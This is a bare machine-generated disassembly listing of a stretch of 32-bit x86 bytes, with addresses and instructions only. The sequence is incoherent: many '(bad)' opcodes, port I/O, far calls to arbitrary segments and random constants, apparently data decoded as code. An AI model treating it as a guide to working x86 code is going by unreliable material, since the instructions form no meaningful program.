  419cd3:	fdivr  DWORD PTR [edx-0x271bf59a]
  419cd9:	xlat   BYTE PTR ds:[ebx]
  419cda:	add    BYTE PTR [ecx+0x5354593e],cl
  419ce0:	scas   eax,DWORD PTR es:[edi]
  419ce1:	enter  0xc187,0x16
  419ce5:	dec    ecx
  419ce6:	or     DWORD PTR [ecx-0x2b33b45d],edi
  419cec:	in     al,0x82
  419cee:	mov    eax,ds:0x9626ad54
  419cf3:	stos   BYTE PTR es:[edi],al
  419cf4:	popa   
  419cf5:	cmp    BYTE PTR [eax],cl
  419cf7:	cmp    eax,0x6accd898
  419cfc:	pop    DWORD PTR [edx+0x4d]
  419cff:	lock xlat BYTE PTR ds:[ebx]
  419d01:	div    BYTE PTR [ebx+0x58e8ad91]
  419d07:	rol    dl,1
  419d09:	mov    edi,DWORD PTR [edi-0x62]
  419d0c:	push   edi
  419d0d:	out    0x54,al
  419d0f:	xchg   edi,eax
  419d10:	sbb    DWORD PTR [esi-0x64],esi
  419d13:	xchg   DWORD PTR [ecx+0x50],edi
  419d16:	test   DWORD PTR [eax+0x53],ebp
  419d19:	(bad)  
  419d1b:	jno    0x419d42
  419d1d:	cmp    DWORD PTR [esi],ecx
  419d1f:	push   ebp
  419d20:	icebp  
  419d21:	inc    ebx
  419d22:	jg     0x419cdc
  419d24:	stos   BYTE PTR es:[edi],al
  419d25:	aas    
  419d26:	fmul   DWORD PTR [edi+0x20]
  419d29:	pop    eax
  419d2a:	push   edx
  419d2b:	fcomp  QWORD PTR [edi+ebx*8-0x4]
  419d2f:	(bad)  
  419d30:	retf   0x6faf
  419d33:	adc    eax,0xdd3e4b4e
  419d38:	clc    
  419d39:	adc    cl,BYTE PTR [edx+0x46]
  419d3c:	adc    bl,BYTE PTR [esi+0x11a14f30]
  419d42:	loop   0x419d7d
  419d44:	xor    dh,ch
  419d46:	dec    ecx
  419d47:	mov    ds:0xf47a0db5,eax
  419d4c:	inc    ebp
  419d4d:	dec    ebx
  419d4e:	inc    esi
  419d4f:	push   0x436447f0
  419d54:	aaa    
  419d55:	add    eax,0xc1275dbf
  419d5a:	push   cs
  419d5b:	es jne 0x419dad
  419d5e:	lea    ecx,[ebx-0x53c2735d]
  419d64:	add    al,0xd6
  419d66:	xchg   ecx,eax
  419d67:	outs   dx,DWORD PTR ds:[esi]
  419d68:	cmp    bh,bh
  419d6a:	mov    ah,0x1d
  419d6c:	(bad)  
  419d6d:	mov    dl,0xcc
  419d6f:	cmp    edi,edx
  419d71:	ret    0x7492
  419d74:	ret    
  419d75:	rcl    DWORD PTR [eax-0x62],1
  419d78:	sar    ecx,1
  419d7a:	inc    ebx
  419d7b:	shl    DWORD PTR [eax],0x5
  419d7e:	jg     0x419d76
  419d80:	add    al,BYTE PTR [ebx]
  419d82:	mov    ebx,0xbe29b730
  419d87:	out    dx,eax
  419d88:	jge    0x419daa
  419d8a:	(bad)  
  419d8b:	pop    eax
  419d8c:	shl    BYTE PTR [edx+0x29],cl
  419d8f:	fst    QWORD PTR [eax]
  419d91:	jecxz  0x419d4f
  419d93:	lahf   
  419d94:	scas   eax,DWORD PTR es:[edi]
  419d95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d96:	repz sar dh,0x50
  419d9a:	inc    eax
  419d9b:	xchg   edi,eax
  419d9c:	pop    ds
  419d9d:	ins    DWORD PTR es:[edi],dx
  419d9e:	jb     0x419dbc
  419da0:	and    DWORD PTR [eax],esi
  419da2:	sub    BYTE PTR [ecx+0x70],dh
  419da5:	xlat   BYTE PTR ds:[ebx]
  419da6:	pop    edi
  419da7:	into   
  419da8:	jle    0x419e08
  419daa:	cmp    BYTE PTR [edi-0x3756cec8],dh
  419db0:	push   0x17
  419db2:	mov    al,ds:0xa867d2d7
  419db7:	loopne 0x419e34
  419db9:	iret   
  419dba:	inc    esi
  419dbb:	push   cs
  419dbc:	xor    DWORD PTR ds:[eax+ebp*1],ebx
  419dc0:	add    ebx,eax
  419dc2:	repnz retf 
  419dc4:	or     eax,0x46ddb368
  419dc9:	ja     0x419dff
  419dcb:	mov    al,0x93
  419dcd:	xchg   esp,eax
  419dce:	popf   
  419dcf:	cmp    dh,al
  419dd1:	pop    ecx
  419dd2:	push   ss
  419dd3:	sub    BYTE PTR [ecx],cl
  419dd5:	cmp    BYTE PTR es:0x13195afc,dh
  419ddc:	enter  0x801a,0x7e
  419de0:	sbb    al,BYTE PTR [eax+0x68]
  419de3:	test   esi,edi
  419de5:	aad    0x20
  419de7:	and    cl,dh
  419de9:	mov    esp,0x74f2248b
  419dee:	sbb    DWORD PTR [eax],ecx
  419df0:	sub    cl,BYTE PTR cs:[eax+edi*1]
  419df4:	lea    ecx,[edx-0x6b3614f3]
  419dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dfb:	sbb    al,ah
  419dfd:	cmp    eax,0xf7a58803
  419e02:	push   0xffffffd7
  419e04:	jl     0x419de5
  419e06:	ror    esp,1
  419e08:	push   edx
  419e09:	call   0xe200:0x848dbd33
  419e10:	rcl    DWORD PTR [ecx],0x8
  419e13:	retf   
  419e14:	repz jge 0x419daa
  419e17:	shr    DWORD PTR [ebx+edx*1],cl
  419e1a:	xchg   edi,eax
  419e1b:	(bad)  
  419e1c:	call   DWORD PTR [eax-0x3f]
  419e1f:	sub    ecx,DWORD PTR [eax+0x1d]
  419e22:	retf   
  419e23:	xchg   esi,eax
  419e24:	dec    eax
  419e25:	enter  0x1bf,0x9c
  419e29:	rol    BYTE PTR [eax-0x2500ffbe],cl
  419e2f:	pop    ss
  419e30:	ret    0x9305
  419e33:	mov    esi,0xb92dde40
  419e38:	xchg   esp,eax
  419e39:	xchg   ebx,eax
  419e3a:	mov    edx,0x1306294e
  419e3f:	jns    0x419e15
  419e41:	mov    bh,0x99
  419e43:	lods   al,BYTE PTR ds:[esi]
  419e44:	je     0x419ec4
  419e46:	mov    es,WORD PTR [ecx]
  419e48:	div    DWORD PTR [ebx+0xf]
  419e4b:	cli    
  419e4c:	push   eax
  419e4d:	inc    esp
  419e4e:	push   ecx
  419e4f:	mov    dl,0xf
  419e51:	jl     0x419df9
  419e53:	fs cmc 
  419e55:	test   BYTE PTR [ebx+eax*2-0x505239e7],cl
  419e5c:	dec    esp
  419e5d:	(bad)  
  419e5e:	loop   0x419e5d
  419e60:	aad    0x89
  419e62:	xchg   DWORD PTR [edi-0x29],esi
  419e65:	aam    0x2c
  419e67:	scas   al,BYTE PTR es:[edi]
  419e68:	shr    BYTE PTR [esi-0x1cc68e6b],1
  419e6e:	xor    ecx,edi
  419e70:	push   edi
  419e71:	jb     0x419e67
  419e73:	jne    0x419e4e
  419e75:	fst    DWORD PTR [esi]
  419e77:	ja     0x419e62
  419e79:	dec    edi
  419e7a:	xor    DWORD PTR [ebx+0x75228d62],0xffffff9c
  419e81:	ins    BYTE PTR es:[edi],dx
  419e82:	test   ch,bh
  419e84:	ficom  DWORD PTR [esi-0x37]
  419e87:	test   BYTE PTR [edi],ah
  419e89:	or     eax,0xbcdc5cd2
  419e8e:	push   edi
  419e8f:	mov    ecx,DWORD PTR [ecx+eiz*8-0x3b294169]
  419e96:	iret   
  419e97:	data16 sub cl,BYTE PTR [ecx-0x4aa8a799]
  419e9e:	leave  
  419e9f:	mov    cl,0x2c
  419ea1:	or     al,0x5a
  419ea3:	pop    ds
  419ea4:	mov    eax,gs
  419ea6:	and    edx,DWORD PTR [ebx]
  419ea8:	push   esi
  419ea9:	push   ss
  419eaa:	bound  edx,QWORD PTR [ebp-0x5101c8a4]
  419eb0:	adc    bl,ch
  419eb2:	dec    ebp
  419eb3:	ins    DWORD PTR es:[edi],dx
  419eb4:	(bad)  
  419eb6:	mov    edx,0x854ddf9b
  419ebb:	fs jae 0x419f20
  419ebe:	mov    DWORD PTR [eax-0x761990e9],eax
  419ec4:	daa    
  419ec5:	xor    BYTE PTR [ebp+0x73],al
  419ec8:	jmp    0x401ced9a
  419ecd:	ins    BYTE PTR es:[edi],dx
  419ece:	or     eax,0x97806a5a
  419ed3:	jo     0x419f05
  419ed5:	ret    0x2cea
  419ed8:	ret    
  419ed9:	fsubr  st,st(5)
  419edb:	push   eax
  419edc:	imul   esp,eax,0xffffff83
  419edf:	inc    esi
  419ee0:	call   0xcd6a051c
  419ee5:	xor    BYTE PTR [edx-0x2b],bh
  419ee8:	pop    esi
  419ee9:	and    DWORD PTR [edx+ecx*1-0x10],esp
  419eed:	icebp  
  419eee:	dec    ebx
  419eef:	inc    esi
  419ef0:	out    0xcc,al
  419ef2:	sub    edx,DWORD PTR [ebp+0x59c49cc3]
  419ef8:	dec    ebp
  419ef9:	call   0xd853:0xd744d077
  419f00:	mov    bh,0x74
  419f02:	jb     0x419ed4
  419f04:	retf   
  419f05:	mov    BYTE PTR [edx],bl
  419f07:	dec    ecx
  419f08:	sbb    eax,0x302dcae8
  419f0d:	sahf   
  419f0e:	or     ah,BYTE PTR [edx]
  419f10:	xchg   esi,eax
  419f11:	popa   
  419f12:	retf   0x2cd1
  419f15:	test   eax,0x9507a26c
  419f1a:	add    eax,0xd39f322b
  419f1f:	ret    
  419f20:	in     eax,0xc1
  419f22:	sub    bl,BYTE PTR ds:[eax+esi*1]
  419f26:	mov    esi,0x3d29aa62
  419f2b:	inc    edi
  419f2c:	(bad)  
  419f2e:	mov    ds:0x46d7f1b0,eax
  419f33:	cmp    al,BYTE PTR [ebp+ecx*2-0xea49473]
  419f3a:	cmp    esp,DWORD PTR [ecx]
  419f3c:	dec    ecx
  419f3d:	pop    ss
  419f3e:	dec    ebx
  419f3f:	data16 mov bl,0xf9
  419f42:	aad    0xca
  419f44:	mov    fs,eax
  419f46:	and    al,0x3c
  419f48:	imul   ebx,DWORD PTR [ebx-0x39e8fedf],0xffffffc8
  419f4f:	int    0xfd
  419f51:	loopne 0x419fbf
  419f53:	inc    ecx
  419f54:	pushf  
  419f55:	sbb    esi,DWORD PTR cs:[esp+eax*8-0x3f1b6c39]
  419f5d:	add    ch,BYTE PTR [esi]
  419f5f:	mov    ch,0xa2
  419f61:	xchg   esp,eax
  419f62:	in     al,dx
  419f63:	inc    edi
  419f64:	std    
  419f65:	mov    dh,0xbd
  419f67:	mov    cs,ecx
  419f69:	sbb    BYTE PTR [esi+0x33],ch
  419f6c:	clc    
  419f6d:	add    eax,0x997be30a
  419f72:	push   esi
  419f73:	sbb    al,bl
  419f75:	push   edi
  419f76:	push   ds
  419f77:	mov    eax,0x6ad6dc8c
  419f7c:	xor    ch,BYTE PTR [eax]
  419f7e:	shr    BYTE PTR [esi],cl
  419f80:	mov    esi,eax
  419f82:	pop    es
  419f83:	or     al,0x3f
  419f85:	jle    0x41a004
  419f87:	test   DWORD PTR [esi],0xe05ff398
  419f8d:	imul   edx,esi,0x77835404
  419f93:	sbb    DWORD PTR [edi-0x51],eax
  419f96:	ror    BYTE PTR [ebx],1
  419f98:	adc    al,0xbc
  419f9a:	xor    al,0xf7
  419f9c:	jne    0x419f2e
  419f9e:	arpl   WORD PTR [eax],si
  419fa0:	pop    ecx
  419fa1:	adc    ah,cl
  419fa3:	mov    ch,0x4d
  419fa5:	fild   WORD PTR [ecx-0x34]
  419fa8:	mov    bl,0xc9
  419faa:	sub    al,0xa5
  419fac:	fnstenv [eax]
  419fae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419faf:	and    ebx,DWORD PTR [eax-0x61bca624]
  419fb5:	pusha  
  419fb6:	xchg   esp,eax
  419fb7:	pushf  
  419fb8:	pusha  
  419fb9:	ja     0x419f4f
  419fbb:	mov    eax,0xa8f4b1b0
  419fc0:	xor    al,0x86
  419fc2:	jp     0x419f67
  419fc4:	push   esi
  419fc5:	inc    ebp
  419fc6:	xor    ecx,ebp
  419fc8:	and    edi,DWORD PTR [ebp+0x69e4b9c8]
  419fce:	sbb    al,BYTE PTR [esi]
  419fd0:	fist   WORD PTR [ebp-0x3a]
  419fd3:	adc    edx,edx
  419fd5:	mov    DWORD PTR [ebx+0x26d8a090],0xbd245ca0
  419fdf:	add    DWORD PTR [eax],ebp
  419fe1:	in     eax,dx
  419fe2:	inc    edx
  419fe3:	icebp  
  419fe4:	ja     0x419f66
  419fe6:	push   es
  419fe7:	in     eax,dx
  419fe8:	(bad)  
  419fe9:	dec    DWORD PTR [eax-0x7b]
  419fec:	sub    BYTE PTR [esi],bl
  419fee:	sahf   
  419fef:	mov    edx,0x4f95b77e
  419ff4:	adc    dh,ch
  419ff6:	(bad)  
  419ff7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ff8:	xchg   edi,eax
  419ff9:	xchg   edi,edx
  419ffb:	pop    es
  419ffc:	inc    edx
  419ffd:	xchg   dh,bh
  419fff:	ss aad 0x6b
  41a002:	pop    ds
  41a003:	mov    gs:0xc77bc4b1,al
  41a009:	sbb    esp,DWORD PTR ds:0x937a66ad
  41a00f:	mov    ah,0x9a
  41a011:	mov    esi,DWORD PTR [edx+ebp*1+0x78]
  41a015:	aas    
  41a016:	mov    esp,0xb234b8fb
  41a01b:	pop    edi
  41a01c:	out    0xda,al
  41a01e:	(bad)  
  41a01f:	sbb    eax,0xdc33939b
  41a024:	adc    BYTE PTR [ecx+0x3b],dl
  41a027:	inc    esi
  41a028:	xor    BYTE PTR [eax+0x1e],bl
  41a02b:	bound  ebx,QWORD PTR [esi+0xfbc045b]
  41a031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a032:	ss fucomi st,st(5)
  41a035:	call   0xd6b25dc8
  41a03a:	and    eax,0x87e2998c
  41a03f:	or     al,BYTE PTR [esi]
  41a041:	dec    edx
  41a042:	jnp    0x41a0b7
  41a044:	or     al,0x1e
  41a046:	mov    ecx,0xeac71f74
  41a04b:	sbb    edi,DWORD PTR [esi-0x4983bd67]
  41a051:	retf   
  41a052:	push   ss
  41a053:	shr    DWORD PTR [esp+ebp*8+0x53664b45],0x5e
  41a05b:	xchg   esi,eax
  41a05c:	add    al,0xf4
  41a05e:	inc    edx
  41a05f:	xor    dh,al
  41a061:	jp     0x41a0dd
  41a063:	cmp    BYTE PTR [ecx],al
  41a065:	imul   DWORD PTR [edi-0x4]
  41a068:	cdq    
  41a069:	push   esi
  41a06a:	fisttp DWORD PTR [esi]
  41a06c:	lods   eax,DWORD PTR ds:[esi]
  41a06d:	ins    BYTE PTR es:[edi],dx
  41a06e:	dec    esi
  41a06f:	jno    0x41a03f
  41a071:	jbe    0x41a03b
  41a073:	mov    BYTE PTR [ebx+0x5e],dh
  41a076:	shl    esi,1
  41a078:	mov    esp,DWORD PTR [ebp-0x57e7b832]
  41a07e:	jo     0x41a0b0
  41a080:	mov    ds:0x163e7b24,eax
  41a085:	sbb    eax,0x291c21b1
  41a08a:	pop    es
  41a08b:	loope  0x41a033
  41a08d:	aam    0xac
  41a08f:	pop    ds
  41a090:	inc    edx
  41a091:	sbb    al,0x78
  41a093:	dec    esi
  41a094:	push   ecx
  41a095:	pextrw esp,(bad),0xc5
  41a097:	mov    al,ds:0x6e265d79
  41a09c:	push   esi
  41a09d:	(bad)  
  41a09e:	jo     0x41a081
  41a0a0:	leave  
  41a0a1:	(bad)  
  41a0a2:	mov    ds:0x4bd1b564,eax
  41a0a7:	dec    ebp
  41a0a8:	mov    edi,edx
  41a0aa:	dec    ecx
  41a0ab:	stc    
  41a0ac:	sub    al,0x39
  41a0ae:	outs   dx,BYTE PTR ds:[esi]
  41a0af:	test   ch,al
  41a0b1:	rcr    DWORD PTR [ebp-0x39],0x38
  41a0b5:	test   esp,ecx
  41a0b7:	cs je  0x41a0fc
  41a0ba:	cmp    al,0x37
  41a0bc:	cmp    ebx,DWORD PTR [ebp+0x1a]
  41a0bf:	sub    BYTE PTR [ecx-0x79fb2193],ah
  41a0c5:	sub    edx,DWORD PTR ds:[eax-0x6f]
  41a0c9:	xor    al,bl
  41a0cb:	sbb    eax,0x8a65a3d0
  41a0d0:	(bad)  
  41a0d1:	jb     0x41a087
  41a0d3:	sbb    bh,al
  41a0d5:	hlt    
  41a0d6:	dec    esi
  41a0d7:	sub    bh,ah
  41a0d9:	retf   
  41a0da:	pop    edx
  41a0db:	and    DWORD PTR [ebp-0x5e],ebp
  41a0de:	or     BYTE PTR [ebx],0x86
  41a0e1:	rol    BYTE PTR [ecx],1
  41a0e3:	pop    ecx
  41a0e4:	dec    ebp
  41a0e5:	cmp    DWORD PTR [edi+0x26f7357f],eax
  41a0eb:	sub    DWORD PTR [edi-0x2c27843f],esi
  41a0f1:	and    eax,0x51b69812
  41a0f6:	xor    dh,al
  41a0f8:	shl    DWORD PTR [edi+ebx*4-0x4b4e3398],1
  41a0ff:	gs jbe 0x41a0e5
  41a102:	fiadd  WORD PTR [ecx]
  41a104:	jp     0x41a0af
  41a106:	test   BYTE PTR [esp+edx*8-0x47109120],0x58
  41a10e:	jnp    0x41a0e8
  41a110:	sar    ebp,1
  41a112:	fs add al,0x59
  41a115:	rcl    ah,0x52
  41a118:	scas   al,BYTE PTR es:[edi]
  41a119:	jg     0x41a171
  41a11b:	mov    edi,0x46352b17
  41a120:	mov    esp,0xd51c7738
  41a125:	sbb    al,0xfa
  41a127:	jge    0x41a14f
  41a129:	cwde   
  41a12a:	das    
  41a12b:	sar    BYTE PTR [edx+0x7e],cl
  41a12e:	mov    ebx,0x1d5bbc33
  41a133:	cmp    ch,BYTE PTR [ebx-0x4f471dc0]
  41a139:	(bad)  
  41a13a:	sbb    BYTE PTR [esi-0x72f86fd6],al
  41a140:	js     0x41a183
  41a142:	(bad)  
  41a144:	pop    eax
  41a145:	dec    ecx
  41a146:	dec    ecx
  41a147:	and    al,cl
  41a149:	sub    al,0x33
  41a14b:	mov    edx,0x78a62898
  41a150:	and    eax,0x63a40755
  41a155:	test   BYTE PTR [ecx],ch
  41a157:	dec    ebp
  41a158:	bound  edx,QWORD PTR [esi+ebp*1+0x45]
  41a15c:	dec    ecx
  41a15d:	or     DWORD PTR [ebx-0x59],eax
  41a160:	(bad)  
  41a161:	jle    0x41a1ad
  41a163:	mov    esi,0xaba2b3
  41a168:	into   
  41a169:	call   0x6b88:0xb2697f1f
  41a170:	lea    esp,[ebx-0x3d]
  41a173:	cmp    esi,edx
  41a175:	in     al,0x30
  41a177:	cmp    BYTE PTR [edx-0x40],0xde
  41a17b:	aam    0x59
  41a17d:	shl    bh,1
  41a17f:	mov    bl,0x3e
  41a181:	or     eax,0xeb7ffa73
  41a186:	inc    esp
  41a187:	xchg   edi,edi
  41a189:	or     ah,BYTE PTR [ecx-0x3d629158]
  41a18f:	mov    ds:0x523010bf,eax
  41a194:	xlat   BYTE PTR ds:[ebx]
  41a195:	xor    ch,BYTE PTR [ecx+0x9541a4d]
  41a19b:	xchg   ecx,eax
  41a19c:	mov    esp,ds
  41a19e:	shl    BYTE PTR [edx],1
  41a1a0:	mul    DWORD PTR [edx]
  41a1a2:	sbb    dl,BYTE PTR [esi+eiz*8-0xd24b05f]
  41a1a9:	or     eax,0x178f7200
  41a1ae:	dec    edx
  41a1af:	sbb    ebp,ecx
  41a1b1:	ret    
  41a1b2:	pop    ebx
  41a1b3:	cmp    ebp,esi
  41a1b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1b6:	cli    
  41a1b7:	adc    ch,BYTE PTR [eax]
  41a1b9:	and    al,0x26
  41a1bb:	(bad)
  41a1bf:	sahf   
  41a1c0:	push   0x45952ab3
  41a1c5:	inc    edx
  41a1c6:	rcl    BYTE PTR [eax-0x35],0x2c
  41a1ca:	sbb    esp,ecx
  41a1cc:	push   ss
  41a1cd:	mov    eax,0x2596f973
  41a1d2:	imul   eax,DWORD PTR [ebx],0xef2447fd
  41a1d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1d9:	frstor ds:0x5ddda19e
  41a1df:	and    dl,BYTE PTR [ebp+0xe6df274]
  41a1e5:	cld    
  41a1e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1e7:	icebp  
  41a1e8:	pop    ebx
  41a1e9:	ficom  DWORD PTR [edi+0x64ba9569]
  41a1ef:	retf   0xf47c
  41a1f2:	ret    0xd6b
  41a1f5:	clc    
  41a1f6:	add    eax,0x623b7a1a
  41a1fb:	push   esi
  41a1fc:	push   0x2d18d41b
  41a201:	sbb    edi,DWORD PTR [ebp-0x7]
  41a204:	es jecxz 0x41a25b
  41a207:	bound  edx,QWORD PTR [esi-0x41]
  41a20a:	push   eax
  41a20b:	xor    DWORD PTR [ecx],0xa7aa77e8
  41a211:	add    eax,0x81792289
  41a216:	mov    al,ds:0x4c2b7a40
  41a21b:	xchg   ebx,eax
  41a21c:	mov    BYTE PTR [eax],dh
  41a21e:	mov    bh,BYTE PTR [ecx-0x6b]
  41a221:	jmp    0x75a7964d
  41a226:	or     al,ch
  41a228:	loopne 0x41a1c2
  41a22a:	icebp  
  41a22b:	hlt    
  41a22c:	inc    ebx
  41a22d:	jne    0x41a29b
  41a22f:	sbb    esp,DWORD PTR [esi+ebp*8+0x36]
  41a233:	sbb    eax,DWORD PTR [eax+0x7f370159]
  41a239:	mov    ah,0xf7
  41a23b:	or     ecx,edx
  41a23d:	call   0x2d61:0xb240f24d
  41a244:	sub    ch,al
  41a246:	add    bl,cl
  41a248:	cmp    ch,dl
  41a24a:	or     ebx,edx
  41a24c:	sbb    al,0x0
  41a24e:	sbb    edi,DWORD PTR [ebp+ecx*1-0x7249b68b]
  41a255:	xchg   edx,eax
  41a256:	shr    DWORD PTR [edx+edi*4],0x2b
  41a25a:	jmp    0x41a20a
  41a25c:	in     eax,dx
  41a25d:	rcl    BYTE PTR [edx-0x3f],cl
  41a260:	inc    esi
  41a262:	call   0xda312e4
  41a267:	jbe    0x41a2d3
  41a269:	ja     0x41a206
  41a26b:	or     ecx,DWORD PTR [ebx-0x750966b8]
  41a271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a272:	sub    esp,ebp
  41a274:	xchg   DWORD PTR [esi+edi*4],edi
  41a277:	mov    esi,0xb901d06f
  41a27c:	cmp    dh,BYTE PTR [eax+eiz*2]
  41a27f:	mov    dl,0x7e
  41a281:	(bad)  
  41a282:	sbb    eax,0xe90888c8
  41a287:	test   BYTE PTR [edi],bl
  41a289:	or     dl,BYTE PTR [edx-0x59]
  41a28c:	pop    esi
  41a28d:	lods   al,BYTE PTR ds:[esi]
  41a28e:	pop    edx
  41a28f:	repnz sahf 
  41a291:	retf   0x113
  41a294:	sbb    DWORD PTR [ebp-0x1],0xffffffd2
  41a298:	stos   DWORD PTR es:[edi],eax
  41a299:	test   BYTE PTR [edi-0x5449c095],0x84
  41a2a0:	mov    ebp,0x4fa694a2
  41a2a5:	inc    edx
  41a2a6:	pop    esi
  41a2a7:	push   es
  41a2a8:	ds popa 
  41a2aa:	jne    0x41a290
  41a2ac:	mov    BYTE PTR [edx+esi*8+0x2d],bl
  41a2b0:	test   DWORD PTR [edx+0x1ea8eed6],0x8403dba9
  41a2ba:	bound  edi,QWORD PTR [eax+0x543b0fc6]
  41a2c0:	scas   eax,DWORD PTR es:[edi]
  41a2c1:	das    
  41a2c2:	or     BYTE PTR [ebp+0x1f27d48],al
  41a2c8:	das    
  41a2c9:	fist   WORD PTR [edx+0x3f]
  41a2cc:	push   edx
  41a2cd:	dec    edi
  41a2ce:	jns    0x41a280
  41a2d0:	nop
  41a2d1:	inc    ebx
  41a2d2:	inc    esi
  41a2d3:	mov    edi,0xe11efb9b
  41a2d8:	scas   al,BYTE PTR es:[edi]
  41a2d9:	ret    0xee6
  41a2dc:	mov    ah,0xc
  41a2de:	jmp    0xe19:0x54ad1eda
  41a2e5:	cmp    BYTE PTR [edx-0x7d],0xe1
  41a2e9:	cmp    eax,0x535311d9
  41a2ee:	lds    edx,FWORD PTR [esi]
  41a2f0:	ror    ah,cl
  41a2f2:	xor    al,0x52
  41a2f4:	test   eax,0xd5af00e5
  41a2f9:	cmp    dh,BYTE PTR [ebx+ebp*4+0x1c8a8963]
  41a300:	and    eax,DWORD PTR [edx-0x79]
  41a303:	test   ecx,ecx
  41a305:	int    0xb
  41a307:	(bad)  
  41a308:	lea    esi,[ecx-0x1c]
  41a30b:	mov    dl,0x37
  41a30d:	gs xchg ebx,eax
  41a30f:	cmp    ch,al
  41a311:	daa    
  41a312:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a313:	mov    ebx,ecx
  41a315:	add    ah,BYTE PTR [ecx+0x4ccdfaae]
  41a31b:	(bad)  
  41a31d:	push   cs
  41a31e:	sbb    al,0xcb
  41a320:	inc    ebp
  41a321:	jo     0x41a2b2
  41a323:	mov    ds:0xb25697cd,al
  41a328:	push   es
  41a329:	sbb    dh,BYTE PTR [edi-0x4f]
  41a32c:	push   ecx
  41a32d:	xchg   ebx,eax
  41a32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a32f:	add    BYTE PTR [eax+edi*1+0x5709bb6c],ch
  41a336:	xor    BYTE PTR [edi-0x2e],bl
  41a339:	jns    0x41a322
  41a33b:	xchg   BYTE PTR [edi+0x65],cl
  41a33e:	repz fbstp TBYTE PTR ds:0x892927e8
  41a345:	adc    dh,al
  41a347:	sahf   
  41a348:	loop   0x41a37b
  41a34a:	scas   eax,DWORD PTR es:[edi]
  41a34b:	sub    dl,ch
  41a34d:	pop    edx
  41a34e:	add    dl,BYTE PTR [edx+0x26]
  41a351:	inc    ebx
  41a352:	pop    esi
  41a353:	add    eax,0xf40c21c2
  41a358:	rcr    BYTE PTR [edx-0x289033bf],1
  41a35e:	mov    esi,0xe864100
  41a363:	xchg   ebx,eax
  41a364:	imul   edi,DWORD PTR [esi-0x605f655b],0xffffffb3
  41a36b:	imul   eax,esi,0xf21d7afe
  41a371:	or     ebp,DWORD PTR [ebx]
  41a373:	pop    ebp
  41a374:	dec    esi
  41a375:	dec    ax
  41a377:	mov    edi,0xcb1717cf
  41a37c:	aam    0x7c
  41a37e:	lock outs dx,DWORD PTR ds:[esi]
  41a380:	add    DWORD PTR [edx],0xfffffff7
  41a383:	mov    BYTE PTR [edi+0x449320f0],ch
  41a389:	inc    eax
  41a38a:	mul    DWORD PTR [edi]
  41a38c:	test   BYTE PTR [ecx-0x25],bh
  41a38f:	adc    eax,0x34578c56
  41a394:	xlat   BYTE PTR ds:[ebx]
  41a395:	add    BYTE PTR [ebx+0x4c5954a7],bl
  41a39b:	test   DWORD PTR [ebx],ebx
  41a39d:	add    eax,0x5a19888c
  41a3a2:	pop    ecx
  41a3a3:	mov    ah,BYTE PTR [ebx+0x5e]
  41a3a6:	or     bl,dl
  41a3a8:	pop    ss
  41a3a9:	push   edx
  41a3aa:	imul   ecx,DWORD PTR [edx],0x5c
  41a3ad:	sbb    DWORD PTR [edi-0x511c2ecf],0x16d32a1
  41a3b7:	adc    eax,0xb270ab56
  41a3bc:	sbb    eax,0x5e310b57
  41a3c1:	add    DWORD PTR [edi+0x34],ecx
  41a3c4:	push   ss
  41a3c5:	in     al,dx
  41a3c6:	or     eax,DWORD PTR [esi+esi*2]
  41a3c9:	test   eax,0xb905573f
  41a3ce:	xchg   ch,al
  41a3d0:	push   esi
  41a3d1:	test   DWORD PTR [edx+esi*1-0x5f722966],esi
  41a3d8:	jne    0x41a39f
  41a3da:	mov    ebp,0x31865059
  41a3df:	test   al,0xf2
  41a3e1:	add    al,0x15
  41a3e3:	data16 lods al,BYTE PTR ds:[esi]
  41a3e5:	add    eax,0x155781c0
  41a3ea:	ins    DWORD PTR es:[edi],dx
  41a3eb:	and    bl,ch
  41a3ed:	xlat   BYTE PTR ds:[ebx]
  41a3ee:	adc    eax,0x797b0ff
  41a3f3:	jbe    0x41a38b
  41a3f5:	xchg   edx,eax
  41a3f6:	push   edi
  41a3f7:	mov    ah,0xfa
  41a3f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a3fa:	xor    dh,BYTE PTR [ebx+0x43]
  41a3fd:	int    0xe9
  41a3ff:	(bad)  
  41a400:	jne    0x41a42a
  41a402:	jmp    0x7ddfe3e0
  41a407:	out    dx,al
  41a408:	loope  0x41a479
  41a40a:	jge    0x41a3e3
  41a40c:	add    al,BYTE PTR [ebx+0x78]
  41a40f:	sub    eax,0x69f4c4b3
  41a414:	enter  0x4511,0x5d
  41a418:	stos   DWORD PTR es:[edi],eax
  41a419:	mov    bh,0xaa
  41a41b:	dec    edx
  41a41c:	in     al,dx
  41a41d:	push   ecx
  41a41e:	xor    eax,DWORD PTR [ebx-0x175bb448]
  41a424:	les    eax,FWORD PTR [ecx-0x2a]
  41a427:	sti    
  41a428:	xchg   ebx,eax
  41a429:	or     esi,ecx
  41a42b:	fsub   QWORD PTR [ebx]
  41a42d:	adc    DWORD PTR [esi-0x80],ebp
  41a430:	adc    DWORD PTR [ebp-0x7ff3cec0],ebp
  41a436:	outs   dx,DWORD PTR ds:[esi]
  41a437:	aad    0x15
  41a439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a43a:	stos   DWORD PTR es:[edi],eax
  41a43b:	mov    eax,edi
  41a43d:	pop    ebx
  41a43e:	fwait
  41a43f:	push   edi
  41a440:	retf   0xa1d9
  41a443:	push   0x69bbf421
  41a448:	lds    esi,FWORD PTR [ebx]
  41a44a:	xchg   eax,esp
  41a44c:	pop    DWORD PTR [ebx-0x6]
  41a44f:	jl     0x41a451
  41a451:	stc    
  41a452:	ret    0xe4e2
  41a455:	icebp  
  41a456:	sbb    dl,BYTE PTR [ecx+0x80679d3]
  41a45c:	lahf   
  41a45d:	jmp    0x41a494
  41a45f:	fcomi  st,st(0)
  41a461:	(bad)  
  41a462:	xlat   BYTE PTR ds:[ebx]
  41a463:	push   esi
